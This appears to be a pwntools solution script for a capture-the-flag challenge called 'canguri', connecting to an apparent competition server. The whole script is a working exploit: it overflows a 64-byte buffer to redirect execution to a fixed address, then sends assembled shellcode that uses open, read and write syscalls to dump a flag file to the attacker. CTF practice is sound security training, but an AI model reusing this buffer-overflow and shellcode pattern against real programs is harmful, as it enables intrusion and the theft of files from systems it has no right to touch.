from pwn import *

elf = context.binary = ELF('./canguri')

if args.GDB:
    p = gdb.debug([elf.path], ''' 
    b main
    c              
    ''')
elif args.REMOTE:
    p = remote('kangaroo.challs.olicyber.it', 20005)
else:
    p = process([elf.path])

addr_flag = 0x4040C0
flag_txt = elf.search('/home/problemuser/flag.txt\x00').__next__()
print(hex(flag_txt))
buff = 8*8
p.sendlineafter('?\n', b'a'*buff + b'a'*8 + p64(0x4040C0))
p.recvline()

payload = asm(f"""
    mov rdi, {flag_txt}
    mov rsi, 0
    mov rax, 2
    syscall

    mov rsi, {addr_flag}
    mov rdi, rax
    mov rdx, 30
    mov rax,0
    syscall

    mov rdi,1
    mov rsi, {addr_flag}
    mov rax,1
    syscall

""")

print(len(payload))
p.sendline(payload)

p.interactive()


